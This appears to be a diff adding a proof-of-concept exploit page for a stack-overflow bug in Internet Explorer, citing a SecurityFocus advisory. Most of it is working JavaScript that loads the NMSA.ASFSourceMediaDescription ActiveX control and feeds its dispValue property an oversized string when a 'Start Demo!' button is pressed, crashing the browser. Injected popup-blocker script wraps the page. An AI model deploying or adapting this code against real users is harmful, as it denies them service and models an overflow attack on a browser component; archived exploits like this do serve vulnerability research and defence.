@@ -1,0 +1,73 @@
+source: http://www.securityfocus.com/bid/19114/info
+
+Microsoft Internet Explorer is prone to a stack-overflow vulnerability.
+
+This issue is triggered when an attacker convinces a victim user to visit a malicious website.
+
+Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.
+
+<script language="JavaScript">
+<!--
+
+function SymError()
+{
+  return true;
+}
+
+window.onerror = SymError;
+
+var SymRealWinOpen = window.open;
+
+function SymWinOpen(url, name, attributes)
+{
+  return (new Object());
+}
+
+window.open = SymWinOpen;
+
+//-->
+</script>
+
+<script>
+
+function Demo() {
+	var a = new ActiveXObject('NMSA.ASFSourceMediaDescription.1');
+	var b = 'XXXX';
+	while (b.length <= 1024) b += b;
+	a.dispValue = b;	
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
+
+
+</body></html>
+
+<script language="JavaScript">
+<!--
+var SymRealOnLoad;
+var SymRealOnUnload;
+
+function SymOnUnload()
+{
+  window.open = SymWinOpen;
+  if(SymRealOnUnload != null)
+     SymRealOnUnload();
+}
+
+function SymOnLoad()
+{
+  if(SymRealOnLoad != null)
+     SymRealOnLoad();
+  window.open = SymRealWinOpen;
+  SymRealOnUnload = window.onunload;
+  window.onunload = SymOnUnload;
+}
+
+SymRealOnLoad = window.onload;
+window.onload = SymOnLoad;
+
+//-->
+</script>
